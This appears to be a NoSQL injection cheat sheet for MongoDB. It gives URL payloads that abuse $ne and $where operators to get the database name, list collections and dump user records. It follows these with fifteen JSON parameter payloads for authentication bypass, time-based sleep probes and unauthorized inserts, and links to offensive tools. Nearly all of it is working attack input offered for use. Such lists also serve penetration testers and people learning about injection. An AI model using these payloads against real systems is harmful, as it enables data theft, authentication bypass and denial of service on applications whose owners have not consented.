# nosqli
```
Get Current MongoDB Name:

http://localhost:4000/user/lookup?username[$ne]=nothing&$where=%20this.db.getName()%20==%20%22%s%22%20;%20return%20true;
http://localhost:4000/user/lookup?username[$ne]=nothing&$where= this.db.getName() == "%s" ; return true;
```
Get All MongoDB Collections:
```
http://localhost:4000/user/lookup?username[$ne]=nothing&$where=%20db.listCollections().forEach(collection%20=%3E%20print(collection.name))%20;%20return%20true;
http://localhost:4000/user/lookup?username[$ne]=nothing&$where= db.listCollections().forEach(collection => print(collection.name)) ; return true;
```
Display the first 5 records in the {{CollectionName}} collection:
```
http://localhost:4000/user/lookup?username[$ne]=nothing&$where=printjson(db.users.find().limit(5).toArray());%20return%20true;
http://localhost:4000/user/lookup?username[$ne]=nothing&$where=printjson(db.users.find().limit(5).toArray()); return true;
```
Tools:
```
> https://github.com/Charlie-belmer/nosqli
> https://github.com/codingo/NoSQLMap
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-json-body
```

NoSQLi in params:
```
1. { "text": { "$ne": 1 } }
2. { "text": { "$where": "1 == 1" } }
3. {
  "text": {
    "$regex": ".*|| 1==1.*"
  }
}
4. {
  "text": {
    "$gt": ""
  }
}
5. {
  "text": ";sleep(5000);"
}
6. {
  "text": {
    "$where": "function() { return 0; return true; }"
  }
}
7. {
  "text": "', $or: [ {}, { 'a':'a' }]}'"
}
8. {
  "text": '";return(true);var xyz=\'a\'"'
}
9. {
  "text": "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);'"
}
10. {
  "text": "' && this.passwordzz.match(/.*/)//+%00'"
}
11. {
  "text": "db.injection.insert({success:1});"
}
12. {
  "text": "' } ], $comment:'successful MongoDB injection'"
}
13. {
  "text": "';sleep(5000);"
}
14. {
  "text": ";sleep(5000);+"
}
15. {
  "text": "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1"
}
